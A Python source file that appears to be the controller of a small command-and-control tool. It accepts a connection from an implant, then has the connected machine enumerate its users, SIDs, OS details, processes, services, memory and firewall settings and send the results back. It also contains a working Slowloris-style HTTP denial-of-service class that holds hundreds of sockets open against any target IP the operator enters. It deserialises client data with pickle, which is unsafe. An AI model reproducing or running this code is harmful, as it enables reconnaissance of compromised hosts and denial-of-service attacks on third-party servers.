import socket, pickle, random, time, sys,netifaces

serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#server_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']  APPLY THIS ONLY TO LINUX


def startconn():
    serv.bind(('127.0.0.1', 2023))                ###<<<<<< REPLACE 127.0.0.1 with server_ip
    serv.listen(5)
    print(f"Server On ")
    global conn, addr
    conn, addr = serv.accept()
    return

def connection():
    while True:
        from_client = ''
        print(ActualValue)
        conn.send(bytes(ActualValue, 'utf8'))
        data = conn.recv(99999)
        if not data : break
        data_variable = pickle.loads(data)
        if ActualValue == 'C3':
            listToStr = '\n'.join([str(elem) for elem in data_variable])
            for excess in listToStr:
                print(excess.name)
        else:
            listToStr = ''.join([str(elem) for elem in data_variable])
            print(listToStr)
            from_client += str(data)
        enumvalue()

def enumvalue():
    value = ""
    global ActualValue
    accepted_command = ["U", "O", "C", "M","F","E","B"]
    print("[U] User Enum \n"
          "[O] OS Enum \n"
          "[C] CPU Enum \n"
          "[M] Memory Enum \n"
          "[F] Firewall Enum \n"
          "[E] Exit \n"
          "[B] Back \n")

    type = input("What is your category? \n")[0]
    if accepted_command[0] == type:
        print("1. Username \n"
                "2. SID \n"
                "3. User Full Name ** \n"
                "4. Last log on \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[1] == type:
        print("1. Machine Name \n"
                "2. Machine Version \n"
                "3. Machine Type \n"
                "4. Processor \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[2] == type:
        print("1. CPU Usage \n"
              "2. List of Processes \n"
              "3. List of Services \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[3] == type:
        print("1. Memory Status \n"
              "2. Memory Available \n"
              "3. Cache Memory ** \n")
        value = input("Which value you would like to extract? \n")
    elif accepted_command[4] == type:
        value = "1"
    elif accepted_command[5] == type:
        print("Connection Closed")
    elif accepted_command[6] == type:
        main()
    else:
        print("Invalid Command")
        enumvalue()
    ActualValue = type + value
    connection()
    return

def attackcommand():
    value = ""
    accepted_command = ["1","E"]
    print("[1] HTTP request Flood \n"
          "[E] Exit \n")
    type = input("What is your attack category? \n")[0]

    if accepted_command[0] == type:
        targetIP = str(input("What is target's IP address: "))
        dos = HTTPRequestDOS(targetIP, 80, socketsCount=200)
        dos.attack(timeout=60 * 10)
    elif accepted_command[1] == type:
        print("Connection Closed")
    else:
        print("Invalid Command")
    connection()
    return

class HTTPRequestDOS():
    def __init__(self, ip, port=80, socketsCount=200):
        print(ip)
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: " + str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while (time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep / len(self._sockets))

def main():
    print("What would you like to operate: \n"
          "1. Enumeration \n"
          "2. Attack")

    while True:
        try:
            main_input = int(input(""))
            break
        except:
            print("We only accept integer value!")

    if main_input == 1:
        enumvalue()
    elif main_input == 2:
        attackcommand()
    else:
        print("Not an option")


startconn()
main()
